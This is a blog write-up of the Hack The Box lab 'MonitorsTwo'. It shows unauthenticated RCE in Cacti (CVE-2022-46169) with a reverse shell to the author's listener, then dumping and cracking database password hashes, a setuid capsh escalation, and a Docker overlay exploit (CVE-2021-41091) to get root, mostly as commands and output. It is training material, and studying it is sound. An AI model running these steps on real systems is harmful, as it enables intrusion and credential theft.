---
layout: post
title: MonitorsTwo (HTB-Easy)
date: 2023-7-6
categories: [Hack The Box]
tags: [cacti,php,unauthenticated-rce,mysql]
---

## Machine Summary

(*ADD AT END*)

## Reconnaissance

To start of the box let's run rustscan and see what we find. Below are the results of the scan:

```bash
h0ax@h0ax:~/monitorstwo$ rustscan -a 10.10.11.211 -b 500 -t 500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.11.211:22
Open 10.10.11.211:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 17:24 UTC
Initiating Ping Scan at 17:24
Scanning 10.10.11.211 [2 ports]
Completed Ping Scan at 17:24, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:24
Completed Parallel DNS resolution of 1 host. at 17:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:24
Scanning 10.10.11.211 [2 ports]
Discovered open port 80/tcp on 10.10.11.211
Discovered open port 22/tcp on 10.10.11.211
Completed Connect Scan at 17:24, 0.10s elapsed (2 total ports)
Nmap scan report for 10.10.11.211
Host is up, received syn-ack (0.038s latency).
Scanned at 2023-07-06 17:24:39 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

Let's go ahead and add monitorstwo.htb to our hosts file and visit the web page on port 80. Doing so gets us the following:

![cacti-landing-page](/assets/images/machines/htb/monitorstwo/cacti.png)

This box is running a program called Cacti. Cacti is an open-source network monitoring and graphing tool used to gather and visualize data from various network devices. It provides a web-based interface that allows administrators to monitor the performance and health of their network infrastructure (*Sourced from Chat-GPT*).

There is a version number for Cacti as well __Version 1.2.22 | (c) 2004-2023__. Searching for vulnerabilities for this returned __CVE-2022-46169-CACTI-1.2.22__, which details how an unauthenticated user can get RCE on machines running vulnerable versions. Before I dug into the specifics of this vulnerability I ran a couple directory and subdomain fuzzing attacks on the box but nothing of interest was found so I pivoted back to focusing on the RCE vulnerability.


## CVE-2022-46169/Unauthenticated RCE 

After a quick Google search, I learned that this RCE vulnerability leveraged improperly configured hostname checks and a user input field that was not sanitized correctly. Furthermore, the user input field is propagated to a string that can execute remote commands (*This means that we can most likely get a reverse shell*). There is a great article I found by Stefan Schiller that was published [here](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/) that goes into minute details of exactly how the vulnerability works.

My basic understanding of how CVE-2022-46169 works, is that there are two steps for RCE to happen: 1.) Bypass the hostname-based authentication check 2.) Inject reverse shell code into the unsanitized user input field.

For step one, the php code for Cacti improperly checks for valid hostnames. Cacti utilizes internal functions that checks its __poller__ database for authorized hostnames, authorized hostnames will be allowed to utilize all Cacti functions. To bypass the hostname check, in the POST request to the target, you need to simply only add the __X-Forwarded__ header and set it to the following, __X-Forwarded: 127.0.0.1__. This tricks the target into thinking that the request is coming from itself and since target machine is authorized to make requests to itself, we now can access the functionality of the Cacti application.

The second step is a bit trickier. I emplore you to look at the article from [sonarsource](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/), there are several steps in the injection flow and the explanation Stefan gives is absolutely fantastic.

## Shell as www-data

There are a couple already premade scripts that we can use. Rapid7 has a nice module that they made to be used with their tool Metasploit but I found this nice and simple Python script that does the exact same thing, I recommend using this one for simplicity. [Exploit Script](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py).

Running the script is easy, just make sure you start a netcat listener before you do:

```bash
h0ax@h0ax:~/monitorstwo$ chmod +x rce-exploit.py 
h0ax@h0ax:~/monitorstwo$ python3 rce-exploit.py  -u http://monitorstwo.htb --LHOST=10.10.16.16 --LPORT=9999
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

Netcat listener:

```bash
h0ax@h0ax:~/monitorstwo$ nc -vnlp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.211 50500
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.1$ pwd
pwd
/var/www/html
bash-5.1$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
bash-5.1$
```

The exploit works and we get logged in as the default user account for the webserver. After running a couple basic commands we can see there is not a user account for the linux machine. I am going to run __find / -name '*/user.txt' 2>/dev/null__ to search the file system for the user flag since for Hack The Box it is always in a user directory. 

Before I run the command I am also going to set the __TERM__ environment variable so I can run the __clear__ command in case I get lots of extraneous output that will clutter up my terminal.

```bash
bash-5.1$ export TERM=xterm
export TERM=xterm
bash-5.1$ find / -name '*user.txt' 2>/dev/null
find / -name '*user.txt' 2>/dev/null
bash-5.1$ find / -name 'user.txt' 2>/dev/null
find / -name 'user.txt' 2>/dev/null
bash-5.1$
```

Interesting, seems like there is not a user flag on the box. Since I know Hack The Box does not do this I am now going to assume that we are in a container since it is common to run applications in containers and have the necessary ports forwarded from the host to the container. The output from the following __ls__ command confirms my suspicions, we are in a Docker container (*this indicated by .dockerenv being present in the root of the file system*). Now we need to find a way to escape this container and laterally move to the host that it is running on.

```bash
bash-5.1$ ls -alh /
ls -alh /
total 164K
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 .
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4.0K Mar 22 13:21 bin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 Jul  6 00:59 dev
-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 etc
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 home
drwxr-xr-x   1 root root 4.0K Nov 15  2022 lib
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 media
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 opt
dr-xr-xr-x 277 root root    0 Jul  6 00:59 proc
drwx------   1 root root 4.0K Mar 21 10:50 root
drwxr-xr-x   1 root root 4.0K Nov 15  2022 run
drwxr-xr-x   1 root root 4.0K Jan  9 09:30 sbin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 Jul  6 00:59 sys
drwxrwxrwt   1 root root  76K Jul  6 18:46 tmp
drwxr-xr-x   1 root root 4.0K Nov 14  2022 usr
drwxr-xr-x   1 root root 4.0K Nov 15  2022 var
```

Usually at this point I would upload something like Linpeas, but circling back the output above, there is a file called __entrypoint.sh__ which is obviously not a common file to be in the root of the file system. This is most likely how we will escape the Docker container.

## Shell as Marcus

Concatinating the file gets us this bash script:

```bash
bash-5.1$ cat /entrypoint.sh
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

Looking at this script shows that there is a mysql database installed on this container. In the __if statement__ block of the script, the second command is of interest. This command connects to the local mysql database and changes fields in the __user_auth__ table. This is most likely where credentials for users will reside. Running the following command returns hashed credentials for two users (*make sure to use the --vertical flag, it makes it so much easier to read the output*):

```bash
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth" --vertical
er_auth" --verticalser=root --password=root cacti -e "SELECT * FROM use
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
                 realm: 0
             full_name: Jamie Thompson
         email_address: admin@monitorstwo.htb
  must_change_password: 
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 663348655
*************************** 2. row ***************************
                    id: 3
              username: guest
              password: 43e9a4ab75570f5b
                 realm: 0
             full_name: Guest Account
         email_address: 
  must_change_password: on
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: 3
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: 
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 0
*************************** 3. row ***************************
                    id: 4
              username: marcus
              password: $2y$10$vcrYth5YcCLl... # No cheating, got to do all the previous steps :)
                 realm: 0
             full_name: Marcus Brune
         email_address: marcus@monitorstwo.htb
  must_change_password: 
       password_change: 
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: 
                locked: on
       failed_attempts: 0
              lastfail: 0
           reset_perms: 2135691668
```

Let's first try to crack the hash for Marcus, usually the hash for the admin creds on Hack The Box machines is not in rockyou. The first part of the hash indicates that we are using the bcrypt hasing function (2y), the second part (10) indicates this algorithm was done with 10 iterations, the third part (vcr...) represents the salt used for the hash, and the fourth part (3WeK...) is the hash of the password. Now lets do __hashcat --help | grep bcrypt__ and find the appropriate algorithm for this hash. 

This return the following:

```bash
  3200  | bcrypt $2*$, Blowfish (Unix)                        | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                      | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                    | Forums, CMS, E-Commerce
```

__3200__ appears to be the correct algorithm. The command we want to run will be the following:

```bash
h0ax@h0ax:~/monitorstwo$ hashcat -m 3200 -a 0 -o marcus-cracked.txt marcus-hash /usr/share/SecLists-master/rockyou.txt --show
h0ax@h0ax:~/monitorstwo$ ll
total 288K
drwxrwxr-x 2 h0ax h0ax 4.0K Jul  6 16:28 ./
drwxrwxr-x 8 h0ax h0ax 4.0K Jul  6 13:23 ../
-rw-rw-r-- 1 h0ax h0ax  91K Jul  6 13:51 ferox-http_monitorstwo_htb-1688665883.state
-rw-rw-r-- 1 h0ax h0ax 176K Jul  6 13:53 ferox-http_monitorstwo_htb-1688666009.state
-rw------- 1 h0ax h0ax   73 Jul  6 16:28 marcus-cracked.txt
-rw-rw-r-- 1 h0ax h0ax   61 Jul  6 16:18 marcus-hash
-rwxrwxr-x 1 h0ax h0ax 2.4K Jul  6 14:42 rce-exploit.py*
h0ax@h0ax:~/monitorstwo$ cat marcus-cracked.txt 
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funky...... #Time do it urself ;)
```

The password allows us to ssh into the host machine as Marcus and now we can get our first flag!

```bash
h0ax@h0ax:~/monitorstwo$ sshpass -p '<redacted>' ssh marcus@monitorstwo.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 06 Jul 2023 08:36:08 PM UTC

  System load:                      0.0
  Usage of /:                       63.8% of 6.73GB
  Memory usage:                     22%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:259e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Thu Jul  6 16:51:07 2023 from 10.10.14.25
marcus@monitorstwo:~$ cat user.txt 
752d739... # ur_turn_now!
```

## Privlege Escalation To Root

Now that we have user access to the host, lets run __sudo -l__ and see what the user has permissions to run as sudo:

```bash
marcus@monitorstwo:~$ sudo -l
[sudo] password for marcus: 
Sorry, user marcus may not run sudo on localhost.
```

Well, I guess we need to upload linpeas afterall. So let's start an http server on our machine and run __wget__ on the target to upload linpeas and pspy64 (just in case we want to see active process information).

After looking at the output for both scripts, I could not find a viable path for privlege escalation. The output of pspy had one interesting thing though, which the following:
```bash
2023/07/06 21:56:04 CMD: UID=0     PID=1344   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock 
2023/07/06 21:56:04 CMD: UID=0     PID=1330   | /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80 
2023/07/06 21:56:04 CMD: UID=999   PID=1252   | mysqld 
2023/07/06 21:56:04 CMD: UID=0     PID=1228   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock 
```

These lines refer to the docker engine (*moby being the name of the engine*). I probably should take a look at docker again and see what I can do there. I checked the current version of Docker on the target machine and it is actually a build that is a couple years old (potentially vulnerable). 

```bash
marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

A quick internet search returned a few different CVEs but [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091) popped out. Versions, 20.10.9 and older are affected by this vulnerability so our target definitely is too. 

The vulnerability involves a bug in the Moby Docker engine. The data directory had subdirectories with unrestricted user permissions, allowing unprivileged users to run commands and traverse restricted directories in the file system. The NIST article states, "When containers included executable programs with extended permission bits (such as `setuid`), unprivileged Linux users could discover and execute those programs. When the UID of an unprivileged Linux user on the host collided with the file owner or group inside a container, the unprivileged Linux user on the host could discover, read, and modify those files" (NIST,"CVE-2021-41091"). 

Let's go back to our shell session in the docker container (re-do the steps to get the initial foothold if you closed out your connection to the docker container. Since the Marcus user doesn't have sudo privleges, we cannot run docker exec on our ssh session).

I am going to check the privleges for /bin/bash. I uploaded linpeas to see what interesting SUID privleges were set on the container. There was only one two of interest, /sbin/capsh.

```bash
bash-5.1$ ls -alh /sbin/capsh
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
```

Doing another search online for CVE-41091 returned a github repo with a bash script that can leverage this vulnerability and spawn a root shell on the host machine. You can find the script [here](https://github.com/UncleJ4ck/CVE-2021-41091). Let's pull this down to our machine and use __wget__ on the web server to pull the script there (*remember to start a python http server locally on your machine*).

After pulling it over to the machine and running the script you get the following output:

```bash
marcus@monitorstwo:~$ chmod +x root-exp.sh 
marcus@monitorstwo:~$ ./root-exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no):
```

If we remember the details from CVE-41901, the /bin/bash binary on the Docker container needs SUID privleges so we are not ready to go yet. Luckily enough for us, having SUID set on the /sbin/capsh binary enables us to change the privleges of the /bin/bash binary. There is a great section [here](https://gtfobins.github.io/gtfobins/capsh/#suid) from GTFOBins that shows you how you can do this.

```bash
www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
which python3
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@50bca5e748b0:/var/www/html# 
```

Cool! Now we have the ability to change the privleges of /bin/bash.

```bash
root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
chmod u+s /bin/bash
root@50bca5e748b0:/var/www/html# ls -alh /bin/bash
ls -alh /bin/bash
-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash
root@50bca5e748b0:/var/www/html#
```

Awesome it worked. Now we can hop back over to our ssh session as Marcus and run that exploit script.

```bash
marcus@monitorstwo:~$ ./root-exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# cd /root
bash-5.1# ls -alh
total 36K
drwx------  6 root root 4.0K Mar 22 13:21 .
drwxr-xr-x 19 root root 4.0K Mar 22 13:21 ..
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwx------  2 root root 4.0K Mar 22 13:21 .cache
drwxr-xr-x  2 root root 4.0K Mar 22 13:21 cacti
drwxr-xr-x  3 root root 4.0K Mar 22 13:21 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Jul  7 03:17 root.txt
drwx------  2 root root 4.0K Mar 22 13:21 .ssh
bash-5.1# cat root.txt 
cb6fa8d..... #UR_TURN_NOW_:)
bash-5.1#
```

Awesome the exploit worked and we got our root flag. To give a bit of context on the above script; to get it work run the script, then __cd__ into the directory where the vulnerable /bin/bash binary is, then run __./bin/bash -p__ to switch over to a privleged shell.


Happy hacking!

- H0ax <3



